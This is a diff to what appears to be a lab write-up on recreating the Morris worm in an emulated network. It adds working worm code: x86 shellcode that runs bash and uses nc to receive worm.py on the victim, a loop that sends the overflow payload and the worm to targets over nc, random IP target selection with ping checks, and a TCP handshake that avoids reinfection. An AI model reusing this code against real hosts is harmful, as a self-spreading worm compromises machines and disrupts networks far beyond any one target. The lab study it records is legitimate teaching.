@@ -119,3 +119,127 @@ as151h-host_0-10.151.0.71           | (^_^) Shellcode is running (^_^)
 #### DEMO
 
 https://github.com/user-attachments/assets/f16e8541-c8a8-4d06-85eb-18a65f79716b
+
+### Step 3: Self Duplication
+
+Divide the attack code into two parts, a small payload that contains a simple pilot code, and a larger payload that contains more sophisticated code. The pilot code is the shellcode included in the malicious payload in the buffer-overflow attack. Once the attack is successful and the pilot code runs a shell on the target, it can use shell commands to fetch the larger payload from the attacker machine, completing the self duplication.
+
+Code snippet of the pilot code:
+
+```
+shellcode= (
+   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
+   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
+   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
+   "\xff\xff\xff"
+   "AAAABBBBCCCCDDDD" 
+   "/bin/bash*"
+   "-c*"
+   # You can put your commands in the following three lines. 
+   # Separating the commands using semicolons.
+   # Make sure you don't change the length of each line. 
+   # The * in the 3rd line will be replaced by a binary zero.
+   " echo '(^_^) Shellcode is running (^_^)';                   "
+   " nc -lnv 8080 > /home/worm.py; chmod +x /home/worm.py;      " # Server receives the worm.py from the attacker
+   "                                                           *"
+   "123456789012345678901234567890123456789012345678901234567890"
+   # The last line (above) serves as a ruler, it is not used
+).encode('latin-1')
+```
+ 
+Code snippet of sending the worm to the target host:
+
+```python
+while True:
+    targetIP = getNextTarget()
+
+    # Send the malicious payload to the target host
+    print(f"**********************************", flush=True)
+    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
+    print(f"**********************************", flush=True)
+    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
+
+    # Give the shellcode some time to run on the target host
+    time.sleep(1)
+
+    # Send the worm to the target host
+    subprocess.run([f"cat ~/worm.py | nc -w5 {targetIP} 8080"], shell=True)
+
+    # Sleep for 10 seconds before attacking another host
+    time.sleep(5) 
+
+    # Remove this line if you want to continue attacking others
+    exit(0)
+```
+
+### Step 4: Propagation
+
+Things need to be done in the propagation part:
+
+1. how to find the next target: in this lab, we use a simple random approach which generate a random IP address in the range of `10.X.0.Y` as the next target where `X` is form `151` to `155` and `Y` is from `70` to `80`.
+2. test if the target is alive and reachable from the attacker: in this lab, we use the `ping` command for testing.
+
+Related Code snippets:
+
+```python
+# Find the next victim (return an IP address).
+# Check to make sure that the target is alive. 
+def getNextTarget():
+   return "10.{X}.0.{Y}".format(X=randint(151, 155), Y=randint(70, 80))
+
+# Check if the target is alive
+def isAlive(targetIP):
+   response = subprocess.run([f"ping -q -c 1 -W 1 {targetIP}"] , capture_output=True, text=True, check=False, shell=True) # -c1: send 1 packet, -W1: wait 1 second
+   result = response.returncode
+
+   if result == -1:
+      return False
+   else:
+      return True
+```
+
+### Step 5: Avoid the self infection
+
+The problem of self infection is that it will cause the host run multiple copies of the worm, which will consume the CPU and memory resources. We do not want to break down or deny the service of the host. So we need a checking mechanism to avoid self infection. 
+
+My approach is running a TCP server on the host, and the worm will check if the server is running by sending a custom PING message to the server. If the server is running, it will reply with a PONG message. The worm will not attack the host if it receives a PONG message.
+
+Related Code snippets:
+
+```python
+def runTCPServer():
+    # Create a TCP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_address = ('0.0.0.0', 17777)
+    sock.bind(server_address)
+    sock.listen(1)
+
+    while True:
+        conn, address = sock.accept()
+        data  = conn.recv(1024)
+        if data == b'AreUWorm':
+            conn.sendall(b'IamWorm')
+        conn.close()
+
+def checkIfInfected(targetIP):
+    # Create a TCP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_address = (targetIP, 17777)
+    sock.settimeout(3)
+
+    try:
+        sock.connect(server_address)
+        sock.sendall(b'AreUWorm')
+        data = sock.recv(1024)
+        if data == b'IamWorm':
+            return True
+    except:
+        pass
+    finally:
+        sock.close()
+
+    return False
+```
+
+## Morris Worm DEMO
+
